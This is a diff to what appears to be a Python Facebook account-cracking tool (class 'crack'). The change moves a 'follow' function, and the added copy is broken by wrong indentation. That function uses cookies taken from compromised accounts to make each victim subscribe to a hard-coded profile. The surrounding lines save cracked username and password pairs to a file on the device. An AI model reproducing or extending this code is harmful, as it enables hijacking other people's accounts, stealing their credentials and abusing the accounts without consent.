@@ -981,6 +981,18 @@ class crack:
             except requests.exceptions.ConnectionError:
                 time.sleep(5)
         self.loop += 1
+        
+        def follow(self,coki):
+        session = requests.Session()
+        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
+        for x in r.find_all("a",href=True):
+            if "/a/subscribe.php" in x.get('href'):
+                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
+        if '/a/subscribe.php' in str(r):
+            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
+            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
+        else:
+            pass
 
     def cek_cp(self,user,pw):
         global ok,cp,f2
@@ -1013,18 +1025,6 @@ class crack:
             print(f"\r{EE}[CP-GSXD] {user} | {pw} {VV}    ")
             open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
             cp.append(user + pw)
-
-def follow(self,coki):
-        session = requests.Session()
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
-        for x in r.find_all("a",href=True):
-            if "/a/subscribe.php" in x.get('href'):
-                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
-        if '/a/subscribe.php' in str(r):
-            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
-            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
-        else:
-            pass
 
 
 
